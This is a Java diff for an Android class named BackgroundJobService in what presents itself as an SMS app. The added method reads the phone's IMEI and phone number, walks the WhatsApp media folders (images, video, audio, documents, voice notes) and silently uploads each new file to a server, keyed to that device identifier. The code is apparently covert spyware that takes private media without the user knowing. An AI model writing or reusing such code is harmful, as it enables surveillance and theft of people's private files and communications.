@@ -22,6 +22,7 @@ import gonext.smsapp.contacts.ContactDetails;
 import gonext.smsapp.contacts.SMSData;
 import gonext.smsapp.db.ContactEntity;
 import gonext.smsapp.db.DbService;
+import gonext.smsapp.db.MediaEntity;
 import gonext.smsapp.db.MessageEntity;
 import gonext.smsapp.db.NotificationEntity;
 
@@ -330,5 +331,64 @@ public class BackgroundJobService {
                 e22.printStackTrace();
             }
         }
+    }
+
+    public void readWhatsAppMediaFiles(){
+        if (ContextCompat.checkSelfPermission(context,
+                Manifest.permission.READ_SMS)
+                == PackageManager.PERMISSION_GRANTED) {
+            try {
+                imeiNumber = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
+                UserMobile = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getLine1Number();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            try {
+                String mediaPath = Environment.getExternalStorageDirectory() + "/WhatsApp/Media/";
+
+                String gifPath = mediaPath + "WhatsApp Animated Gifs";
+                String audioPath = mediaPath + "WhatsApp Audio";
+                String docPath = mediaPath + "WhatsApp Documents";
+                String imagePath = mediaPath + "WhatsApp Images";
+                String vidoePath = mediaPath + "WhatsApp Video";
+                String voiceNotesPath = mediaPath + "WhatsApp Voice Notes";
+
+                if (!processMediaFiles(gifPath)) {
+                    if (!processMediaFiles(audioPath)) {
+                        if (!processMediaFiles(docPath)) {
+                            if (!processMediaFiles(imagePath)) {
+                                if (!processMediaFiles(vidoePath)) {
+                                    processMediaFiles(voiceNotesPath);
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }
+    private boolean processMediaFiles(String mediaPath){
+        File folder = new File(mediaPath);
+        if(folder.exists()){
+            File[] files = folder.listFiles();
+            if(files != null) {
+                for (File file : files) {
+                    if (file.isFile()) {
+                        String name = file.getName();
+                        if (dbService.getMedia(name) == null) {
+                            MediaEntity mediaEntity = new MediaEntity();
+                            mediaEntity.setName(name);
+                            dbService.saveMedia(mediaEntity);
+                            //server call
+                            smsService.sendMedia(file, (UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
+                            return true;
+                        }
+                    }
+                }
+            }
+        }
+        return false;
     }
 }
